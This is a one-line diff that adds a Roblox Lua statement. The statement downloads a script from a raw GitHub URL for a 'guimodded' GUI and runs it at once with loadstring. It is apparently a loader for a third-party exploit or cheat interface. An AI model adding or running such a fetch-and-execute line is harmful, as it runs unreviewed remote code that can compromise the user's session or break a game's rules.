@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Vata909tt/guimodded/refs/heads/main/GUI'))()
